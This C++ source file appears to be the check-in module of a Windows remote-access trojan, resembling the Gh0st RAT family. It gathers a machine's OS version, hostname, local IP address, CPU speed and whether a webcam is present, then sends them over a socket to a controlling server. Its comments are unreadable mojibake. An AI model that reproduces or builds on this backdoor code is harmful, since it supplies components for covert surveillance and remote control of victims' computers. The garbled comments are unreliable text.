#include "StdAfx.h"
#include "Login.h"
#include "Common.h"
#include "RegEditEx.h"
#include <windows.h>
#include <vfw.h>    //����ͷ�����ͷ�ļ�


#pragma comment(lib,"Vfw32.lib")


//��½����
int SendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
{
	int nRet = SOCKET_ERROR;
	// ��¼��Ϣ
	LOGININFO	LoginInfo;
	// ��ʼ��������
	LoginInfo.bToken = TOKEN_LOGIN; // ����Ϊ��¼
	LoginInfo.bIsWebCam = 0;        //û������ͷ
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // ע��ת������
	// IP��Ϣ
	
	// ������
	char hostname[256];
	//				127.0.0.1	  ASUS-PC
	GetHostRemark(strServiceName, hostname, sizeof(hostname));  //����Լ�������
	

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	//The getsockname function retrieves the local name for a socket.
	// ����IP��ַ
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

	//˭  TCP/IP 
	
	
	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));

	LoginInfo.CPUClockMhz = CPUClockMhz();   //���CPU������
	LoginInfo.bIsWebCam = IsWebCam();        //��������ͷ
	

	LoginInfo.dwSpeed = dwSpeed;             //�����ٶ�
	
	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));   //�������ƶ˷������ǻ�õ���Ϣ
	
	return nRet;
}

//�������������
UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));

	//Dllע��  SocketЭ��  Ndis
//	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	//��ע����л��
//	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, 
//		(char *)lpBuffer, NULL, uSize, 0);
	
//	if (lstrlen(lpBuffer) == 0)   //���ʧ�����Ǿ͵���API����
	{
		gethostname(lpBuffer, uSize);   
	}
	
	return lstrlen(lpBuffer);
}



//��ע����л��System����Ϣ
DWORD CPUClockMhz()
{
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, 
		"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}


bool IsWebCam()
{
	bool	bRet = false;
	
	char	lpszName[100], lpszVer[50];
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet = capGetDriverDescription(i, lpszName, sizeof(lpszName),      //ϵͳ��API����
			lpszVer, sizeof(lpszVer));
	}
	return bRet;
}